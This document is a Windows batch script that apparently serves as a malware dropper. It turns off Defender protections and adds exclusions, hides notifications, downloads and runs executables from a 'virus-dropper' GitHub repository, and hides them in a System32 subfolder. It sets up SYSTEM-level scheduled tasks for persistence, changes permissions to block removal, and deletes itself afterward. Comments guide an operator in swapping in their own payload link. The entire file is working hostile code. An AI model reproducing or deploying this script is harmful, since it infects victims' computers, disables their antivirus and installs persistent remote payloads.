del /f "%appdata%\Windows\Install.bat"
rd %appdata%\Windows
powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
color ef
::disables ControlledFolderAccess to access files and folders
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
start /min AV.bat
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows3.exe" --output "%appdata%\Windows3.exe"
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
::windows defender exclusions
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows2.exe'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows3.exe'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"winmanager.exe'"
md "%systemroot%\System32\Windowsexe"

::upload files here: github.com - create account and create repository (public) then upload files
::put payload file DIRECT download link here:
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)


move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"

::update file here
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" --output "%appdata%\update.bat"
move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
::do not change the --output


powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Winmanager'"
NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
move "%appdata%\Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.exe"
copy "%systemroot%\System32\Windowsexe\Windows.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
start "Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.exe"
powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL LIMITED
SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
del /f rickroll.*
del /f NSudo.exe
powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
timeout /t 5 /nobreak
icacls  "%systemroot%\System32\Windowsexe\Windows.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windowsexe\Windows2.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windowsexe\Windows3.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windowsexe\Update.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windowsexe\AV.bat" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls  "%systemroot%\System32\Windows Manager\winmanager.exe" /t /grant everyone:R "%UserName%":R System:F Administrators:F
icacls "%systemroot%\System32\Windowsexe\AV.bat" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
icacls "%systemroot%\System32\Windowsexe\Update.bat" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
icacls "%systemroot%\System32\Windowsexe\Windows.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
icacls "%systemroot%\System32\Windowsexe\Windows2.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
icacls "%systemroot%\System32\Windowsexe\Windows3.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
icacls "%systemroot%\System32\Windows Manager\winmanager.exe" /grant everyone:(OI)(CI)R "%username%":(OI)(CI)R
icacls "%systemroot%\System32\Windowsexe\AV.bat" /deny everyone:R "%username%":R
icacls "%systemroot%\System32\Windowsexe\Update.bat" /deny everyone:R "%username%":R
icacls "%systemroot%\System32\Windowsexe\Windows.exe" /deny everyone:R "%username%":R
icacls "%systemroot%\System32\Windowsexe\Windows2.exe" /deny everyone:R "%username%":R
icacls "%systemroot%\System32\Windowsexe\Windows3.exe" /deny everyone:R "%username%":R
icacls "%systemroot%\System32\Windows Manager\winmanager.exe" /deny everyone:R "%username%":R
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
